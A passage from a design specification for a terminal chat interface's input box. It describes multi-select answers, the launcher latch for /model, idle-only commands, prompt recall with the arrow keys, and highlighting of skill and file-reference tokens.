the values one enum key may take — is **two-cell**: the value,
and a `(current)` mark on the one the key already holds.

**`␣` ticks a multi-select answer, and `⏎` is still the one send.** A question the model marked
`multi_select` draws that box in front of every answer, and while the box below is empty `␣` ticks
and un-ticks the highlighted row. `↑/↓` still only move the highlight, and no `Send` row is added at
the end of the offering: the key that takes every other decision surface takes this one too. `⏎`
sends **every ticked answer**, one per line, in the order they were offered — and with **nothing**
ticked it sends the highlighted answer alone, so the single-select gesture arrives as the degenerate
case rather than as a second rule to learn. On a single-select question there is nothing to toggle,
so `␣` falls through to the box and types a space, opening the free-text answer it always did.
Typing hides the offering there as it does under any question and `⏎` then sends only what was
typed; deleting back to empty brings the offering back with the ticks exactly as they were, because
a draft the human abandoned should not quietly discard the answers they had already chosen. The hint
under the rows names the extra key and nothing else changes about it:
`↑↓ select · ␣ toggle · ⏎ send · type for a custom answer · esc cancel`, truncated from its right
with the pane's `…` on a width that cannot seat it, like every other hint.

**`/model`'s launcher accept is the one that does not finish on the spot.** Picking a Launch
profile takes the actuation latch and hands the pane's decision to a blocking launcher verb: the
overlay closes, the footer's model slot says `loading <profile>…`, and the launcher's steps arrive
as transcript notes until the beat completes the move. While that latch is held, the paths that
would open an Exchange (a send, `/continue`, `/compact`) and the four switching verbs (`/model`,
`/server`, `/unload-model`, `/stop-server`) are each refused with one line instead of acting; Esc
does not cancel an actuation, because the launcher's own cancel is `/stop-server` once the verb
returns.

**The box never goes dead while the model works.** Every region stays open. A command that needs a
quiescent engine is not hidden — its row fills the menu's `— idle only` column in the pane's faint
unselected style, and accepting it anyway prints the note and leaves the draft exactly as it was.
The tag belongs to the moment rather than to the verb: while the engine is idle no row fills that
cell, so the column collapses and the menu reads exactly as it does when nothing can be gated. The
verbs that only report (`/version`, `/skills`, `/usage`, `/inspect`, `/confine` with no arguments)
run there and then, and
so do `/schedule` and `/schedule-stop`, which touch no engine at all: a schedule fires as a run of
its own, so creating or stopping one needs no quiet moment in this session.

**Prompt recall — ↑ walks what this workspace has already sent.** On an **empty** box ↑ loads the
newest prompt sent from this workspace, caret at its end; further ↑ steps older and stops at the
oldest — the key is still recall's there, so a walk that has hit the bottom moves nothing rather
than jumping the caret; ↓ steps newer, and one ↓ past the newest empties the box again. The box
grows and shrinks around the recalled text like any other value, so a multi-row prompt comes back
at its full height. The walk owns ↑/↓ only while the box holds a freshly recalled entry the human
has taken **no other action in**: any keypress that is not one of those two arrows, and every
non-key edit — a paste, a click in the box, a window resize, the ask borrowing the box — ends
recall mode and the arrows are the caret's again. A typed draft never starts a walk. It is live in
the two states where the box is the human's own, idle and running, and never under an ask, where
↑/↓ move the choice highlight instead. **The session-reset pair `/new`/`/clear` never enters the
walk**: those lines are sent like any other command and recorded like none of them, so ↑ cannot
hand back a line whose ⏎ wipes the session. **A recalled `/command` opens no dropdown**: loading an entry
dismisses the suggestion pane rather than re-deriving it, because that pane claims ↑/↓ before recall
ever sees them — the walk would otherwise be stolen by its own first entry. The pane comes back the
moment the human acts, which is the same moment the arrows do. The empty box advertises the gesture
in its own legend, in both states: `Send a message…  ⏎ send · ⇧⏎/⌥⏎ newline · ↑ recall · ⌃c quit`
at idle, `queue a message…  ⏎ queue · ↑ recall · esc stop` while the model works — a placeholder is
only ever painted on an empty box, which is exactly the box where ↑ starts a walk. **The idle legend
names ⇧⏎ only on a terminal that negotiated the enhanced keyboard protocol**, which is what makes
that chord arrive as a key of its own rather than as a plain ⏎ — a send. Until the terminal answers
bubbletea's keyboard query (and forever, on one that never will) the legend reads
`Send a message…  ⏎ send · ⌥⏎ newline · ↑ recall · ⌃c quit`, naming only the chord every terminal
delivers; a capable one answers within the first frames and the legend upgrades in place. The
shift+enter binding itself is unconditional either way — the legend is the only thing that adapts.

**Tokens light up when they resolve.** Inside the box a `/token` is painted in the `skill` role
only when it names a skill in the catalog, and an `@path` in the `file-ref` role only when the path
is in the workspace listing. Everything else stays plain prompt text, so the colour is a live
verdict rather than decoration: a typo simply never lights. The two roles are the pair every scheme
must keep tellable apart (ADR 0027), because this is the whole signal. Both accents are drawn on
the box's own interior (`surface`), so the field still reads as one band, and a token wrapped across rows is painted on
every row it spans. A drag-selection drawn over a token wins — selection is painted last.

**What is not here any more.** There is no strip of attached-skill chips above the box, and no
`✦ name` tag row under the sent block either. A skill is its `/token` in the text now, so the
message says what it invokes without a second surface repeating it — and the transcript answers the
same way: the sent user block, and a delivered `⧖` interjection block with it, paints the `/token`
where it stands in the `skill` role, mirroring "Tokens light up when they resolve." above. What the
colour answers to is what differs. In the box it is a live verdict, re-derived against the catalog
on every keystroke. In the transcript it is a **persisted** one: the spans are captured at send
time and stored on the entry, so a replayed session paints exactly what that send resolved to even
if the skill has since been renamed or deleted, and the render path asks the catalog nothing. The
`/` menu's `✦` rows stay as described above — there the glyph tells a skill from a command in a
list of both, which is the one job left to it.
